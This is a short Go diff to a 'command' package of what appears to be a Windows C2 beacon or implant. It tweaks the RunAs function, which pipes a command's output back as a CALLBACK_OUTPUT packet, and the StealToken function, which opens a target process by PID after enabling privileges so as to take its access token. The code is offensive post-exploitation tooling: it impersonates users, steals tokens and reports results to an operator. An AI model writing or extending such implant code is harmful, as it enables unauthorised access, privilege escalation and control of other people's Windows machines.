@@ -3,6 +3,7 @@
 package command
 
 import (
+	"bytes"
 	"errors"
 	"fmt"
 	"golang.org/x/sys/windows"
@@ -74,7 +75,6 @@ func RunAs(b []byte) error {
 		SecurityDescriptor: nil,
 		InheritHandle:      1, //true
 	}
-
 	// create anonymous pipe
 	err = windows.CreatePipe(&hRPipe, &hWPipe, &sa, 0)
 	if err != nil {
@@ -101,7 +101,8 @@ func RunAs(b []byte) error {
 	buf := make([]byte, 1024*8)
 	//var done uint32 = 4096
 	var read windows.Overlapped
-	_ = windows.ReadFile(hRPipe, buf, nil, &read)
+	var bytesRead uint32
+	_ = windows.ReadFile(hRPipe, buf, &bytesRead, &read)
 
 	result := buf[:read.InternalHigh]
 	finalPacket := packet.MakePacket(CALLBACK_OUTPUT, result)
@@ -179,7 +180,8 @@ func Rev2self() error {
 }
 
 func StealToken(b []byte) error {
-	pid := packet.ReadInt(b)
+	buf := bytes.NewBuffer(b)
+	pid := packet.ReadInt(buf)
 	// getprivs first
 	_, _ = getPrivs(privileges)
 	ProcessHandle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, pid)
